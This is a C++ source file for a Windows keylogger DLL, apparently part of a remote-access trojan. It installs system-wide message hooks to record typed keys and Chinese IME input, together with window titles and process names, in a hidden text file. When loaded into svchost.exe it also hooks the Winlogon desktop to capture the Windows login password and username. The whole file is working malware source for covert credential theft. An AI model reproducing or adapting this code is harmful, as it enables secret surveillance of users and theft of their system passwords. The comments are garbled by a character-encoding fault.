// MyKeyMonTrans.cpp: implementation of the CMyKeyMTrans class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

#define KEY_INSERT_NORMAL		1
#define KEY_INSERT_LOGIN		2
#define KEY_INSERT_LOGIN_END	3

//�������
#pragma data_seg("waits")
HWND	g_hActiveWnd = NULL;
HHOOK	g_hKeyHK_EN = NULL;
HHOOK	g_hKeyHK_CN = NULL;
HHOOK	g_hKeyHK_LG = NULL;
WCHAR	g_srcBuf[256] = {0};
WCHAR	g_destBuf[256] = {0};
DWORD	nCnKeyTimeOut = 0;
DWORD	nEnKeyTimeOut = 0;
BOOL	m_IsLogin = FALSE;
DWORD	dKeyThreadId = 0;
char	m_WaitMetuxName[256] = {0};
char	m_KeyFilePath[256] = {0};
WCHAR	pLoginBuf[2048] = {0};
#pragma data_seg()
#pragma comment(linker, "/section:waits, rws")

extern HINSTANCE ghInstance;
void SaveBuffer(WCHAR* sText, HWND hWnd, BOOL IsCheckHwnd);
void InsertBuffer(WCHAR* sText, WORD nCmd);
BOOL MyAppendFile(LPCTSTR m_FileName, LPVOID pData, DWORD dLen);

LRESULT CALLBACK HOOK_WM_CHAR_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	if (nCode >= 0 )
	{
		PMSG pMsg = (PMSG) lParam;
		if(pMsg->message == WM_CHAR && wParam == PM_REMOVE && GetTickCount() - nCnKeyTimeOut > 5)
		{
			nEnKeyTimeOut = GetTickCount();
			switch(pMsg->wParam)
			{
				case VK_BACK:
					InsertBuffer(L"[<=]", KEY_INSERT_NORMAL);
					break;
						
				case VK_RETURN:
					InsertBuffer(L"\r\n", KEY_INSERT_NORMAL);
					break;

				default :
					{
						WCHAR m_Text[3] = {0};
						memcpy(m_Text, &pMsg->wParam, sizeof(WPARAM));
						InsertBuffer(m_Text, KEY_INSERT_NORMAL);
					}
					break;
			}
		}
	}
	return CallNextHookEx(g_hKeyHK_EN, nCode, wParam, lParam);
}

LRESULT CALLBACK HOOK_WM_IME_COMPOSITION_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	CWPSTRUCT* pMsg = (CWPSTRUCT*) lParam;
	if(m_IsLogin)
	{
		//�Ѿ���¼
		m_IsLogin = FALSE;

		//��Ҫ�����¼����
		InsertBuffer(L"\r", KEY_INSERT_LOGIN_END);
		WCHAR m_UserName[256] = L"��ǰ�û���";
		DWORD len = 256 - lstrlenW(m_UserName) - 1;
		GetUserNameW(m_UserName + lstrlenW(m_UserName), &len);
		lstrcatW(m_UserName, L" �û����룺");
		InsertBuffer(m_UserName, KEY_INSERT_LOGIN_END);
		InsertBuffer(L"\n", KEY_INSERT_LOGIN_END);
	}

	if(nCode == HC_ACTION)
    {
		switch (pMsg->message)
        {
			case WM_IME_COMPOSITION:
            {
				if(GetTickCount() - nEnKeyTimeOut > 5)
				{
					nCnKeyTimeOut = GetTickCount();
					HWND hWnd = GetForegroundWindow();
              		HIMC hIMC = ImmGetContext(hWnd);
					memset(g_srcBuf, 0, 256 * sizeof(WCHAR));
					DWORD dwSize = ImmGetCompositionString(hIMC, GCS_RESULTSTR, NULL, 0);
					ImmGetCompositionStringW(hIMC, GCS_RESULTSTR, g_srcBuf, dwSize);
					if(StrCmpW(g_srcBuf, g_destBuf) != 0)
					{
						InsertBuffer(g_srcBuf, KEY_INSERT_NORMAL);
						lstrcpyW(g_destBuf, g_srcBuf);
					}
					if(hIMC)
					{
						ImmReleaseContext(hWnd, hIMC);
					}
				}
            }
            break;
        }
    }
	return(CallNextHookEx(g_hKeyHK_CN, nCode, wParam, lParam));
}

LRESULT CALLBACK HOOK_WM_CHAR_LOGIN_Proc (int nCode, WPARAM wParam, LPARAM lParam)
{
	//�����¼����
	if(nCode >= 0 )
	{
		PMSG pMsg = (PMSG) lParam;
		if(pMsg->message == WM_CHAR)
		{
			m_IsLogin = TRUE;
			switch(pMsg->wParam)
			{
				case VK_BACK:
					InsertBuffer(L"[<=]", KEY_INSERT_LOGIN);
					break;
						
				default :
					{
						WCHAR m_Text[3] = {0};
						memcpy(m_Text, &pMsg->wParam, sizeof(WPARAM));
						InsertBuffer(m_Text, KEY_INSERT_LOGIN);
					}
					break;
			}
		}
	}
	return CallNextHookEx(g_hKeyHK_EN, nCode, wParam, lParam);
}

BOOL MyAppendFile(LPCTSTR m_FileName, LPVOID pData, DWORD dLen)
{
	//ȡ����ȫ����Ϣ
	HANDLE hFile = CreateFile(
				m_FileName,  
                GENERIC_WRITE,   
                0, 
                NULL,           
                OPEN_ALWAYS,      
                FILE_ATTRIBUTE_NORMAL, 
                NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	SetFilePointer(hFile, 0, NULL, FILE_END);
	DWORD nWriteLen = 0;
	WriteFile(hFile, pData, dLen, &nWriteLen, NULL);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);
	return TRUE;
}

void GetMoudleMame(DWORD pId, char* pExeName)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pId);
    if(NULL == hProcess) 
	{
		return;
	}
	char m_ExeName[MAX_PATH] = {0};
	if(GetModuleFileNameEx(hProcess, NULL, m_ExeName, 1024) > 0)
	{
		lstrcpy(pExeName, m_ExeName);
	}
    CloseHandle(hProcess);
}

void SaveBuffer(WCHAR* sText, HWND hWnd, BOOL IsCheckHwnd)
{
	//ת���ִ�
	char m_Text[256] = {0};
	WideCharToMultiByte(CP_ACP, 0, sText, lstrlenW(sText) + 1, m_Text, 256, NULL, NULL);

	char szTime[128] = {0};
	char szTempBuf[512] = {0};
	char szTitle[256] = {0};
	char szProcess[256] = {0};

	//��ǰ����
	if(IsCheckHwnd && g_hActiveWnd != hWnd)
	{
		g_hActiveWnd = hWnd;

		//��ǰʱ��
		SYSTEMTIME sysTM;
		GetLocalTime(&sysTM);
		wsprintfA(szTime, "[%04d-%02d-%02d %02d:%02d:%02d]", sysTM.wYear, sysTM.wMonth, 
			sysTM.wDay,	sysTM.wHour, sysTM.wMinute, sysTM.wSecond);

		DWORD nProcessId = 0;
		GetWindowThreadProcessId(g_hActiveWnd, &nProcessId);

		//���ڱ���
		GetWindowText(g_hActiveWnd, szTitle, MAX_PATH);
		GetMoudleMame(nProcessId, szProcess);
		wsprintf(szTempBuf, "\r\n%s %s %s\r\n", szTime, szTitle, szProcess);
	}

	//д���ݵ�����
	lstrcat(szTempBuf, m_Text);
	DWORD len = lstrlen(szTempBuf);

	HANDLE hKeyWaitMetux = OpenMutex(SYNCHRONIZE, FALSE, m_WaitMetuxName);
	WaitForSingleObject(hKeyWaitMetux, 0xffffffff);
	MyAppendFile(m_KeyFilePath, szTempBuf, len);
	ReleaseMutex(hKeyWaitMetux);
	CloseHandle(hKeyWaitMetux);
}

void InsertBuffer(WCHAR* sText, WORD nCmd)
{
	HWND hWnd = GetActiveWindow();

	//�����ֵ
	switch(nCmd)
	{
		case KEY_INSERT_NORMAL :
			SaveBuffer(sText, hWnd, TRUE);
			break;

		case KEY_INSERT_LOGIN :
			lstrcatW(pLoginBuf, sText);
			break;

		case KEY_INSERT_LOGIN_END :
			{
				if(sText[0] == L'\r')
				{
					//��ǰʱ��
					WCHAR szTime[256] = {0};
					SYSTEMTIME sysTM;
					GetLocalTime(&sysTM);
					wsprintfW(szTime, L"\r\n***����Ϊϵͳ��¼�ʺź�����[%04d-%02d-%02d %02d:%02d:%02d]***\r\n", sysTM.wYear, sysTM.wMonth, 
						sysTM.wDay,	sysTM.wHour, sysTM.wMinute, sysTM.wSecond);
					SaveBuffer(szTime, hWnd, FALSE);
				}
				else if(sText[0] == L'\n')
				{
					//�����¼����
					SaveBuffer(pLoginBuf, hWnd, FALSE);
					SaveBuffer(L"\r\n", hWnd, FALSE);
					ZeroMemory(pLoginBuf, 65535 * sizeof(WCHAR));
				}
				else
				{
					SaveBuffer(sText, hWnd, FALSE);
				}
			}
			break;
	}
}

void WINAPI StopKey()
{
	char m_ModuleFileName[256] = {0};
	GetModuleFileName(ghInstance, m_ModuleFileName, 255);
	char* pStart = strrchr(m_ModuleFileName, '\\');
	char* pEnd = strrchr(m_ModuleFileName, '.');

	char m_AppName[256] = {0};
	memcpy(m_AppName, pStart + 1, pEnd - pStart);

	//�˳��¼�
	char m_WaitEventName[256] = {0};
	lstrcpy(m_WaitEventName, m_AppName);
	lstrcat(m_WaitEventName, m_AppName);
	HANDLE hExitEvent = OpenEvent(EVENT_MODIFY_STATE, FALSE, m_WaitEventName);
	if(hExitEvent != NULL)
	{
		SetEvent(hExitEvent);
		CloseHandle(hExitEvent);
	}
}

void WINAPI StartKey()
{
	char m_ModuleFileName[256] = {0};
	GetModuleFileName(ghInstance, m_ModuleFileName, 255);
	char* pStart = strrchr(m_ModuleFileName, '\\');
	char* pEnd = strrchr(m_ModuleFileName, '.');

	char m_AppName[256] = {0};
	memcpy(m_AppName, pStart + 1, pEnd - pStart - 1);

	//�ų�������
	lstrcpy(m_WaitMetuxName, m_AppName);
	HANDLE hWaitMetux = CreateMutex(NULL, FALSE, m_WaitMetuxName);

	//�˳��¼�
	char m_WaitEventName[256] = {0};
	lstrcpy(m_WaitEventName, m_AppName);
	lstrcat(m_WaitEventName, m_AppName);
	HANDLE hExitEvent = CreateEvent(NULL, TRUE, FALSE, m_WaitEventName);

	//�����ļ�����
	*pEnd = 0x00;
	lstrcat(m_ModuleFileName, ".txt");
	strcpy(m_KeyFilePath, m_ModuleFileName);

	HDESK hOldDesktop = GetThreadDesktop(GetCurrentThreadId());

	//������ĺ�Ӣ��
	HDESK hNewDesktop = OpenDesktop("Default", 0, FALSE, MAXIMUM_ALLOWED);
	if(hNewDesktop != NULL)
	{
		SetThreadDesktop(hNewDesktop);
	}

	if(NULL == g_hKeyHK_CN)
	{
		g_hKeyHK_CN = SetWindowsHookExW(WH_CALLWNDPROC, HOOK_WM_IME_COMPOSITION_Proc, ghInstance, 0);
	}
	if(NULL == g_hKeyHK_EN)
	{
		g_hKeyHK_EN = SetWindowsHookExW(WH_GETMESSAGE, HOOK_WM_CHAR_Proc, ghInstance, 0);
	}

	GetModuleFileName(NULL, m_ModuleFileName, 255);
	CharLower(m_ModuleFileName);
	if(strstr(m_ModuleFileName, "svchost.exe") != NULL)
	{
		//��ص�¼����
		hNewDesktop = OpenDesktop("Winlogon", 0, FALSE, MAXIMUM_ALLOWED);
		if(hNewDesktop != NULL)
		{
			SetThreadDesktop(hNewDesktop);
		}
		if(NULL == g_hKeyHK_LG)
		{
			g_hKeyHK_LG = SetWindowsHookExW(WH_GETMESSAGE, HOOK_WM_CHAR_LOGIN_Proc, ghInstance, 0);
		}
		SetThreadDesktop(hOldDesktop);
	}

	//�ȴ��˳�
	WaitForSingleObject(hExitEvent, 0xfffffff);

	if(g_hKeyHK_EN != NULL)
	{
		UnhookWindowsHookEx(g_hKeyHK_EN);
	}
	if(g_hKeyHK_CN != NULL)
	{
		UnhookWindowsHookEx(g_hKeyHK_CN);
	}
	if(g_hKeyHK_LG != NULL)
	{
		UnhookWindowsHookEx(g_hKeyHK_LG);
	}

	CloseHandle(hExitEvent);
	CloseHandle(hWaitMetux);
}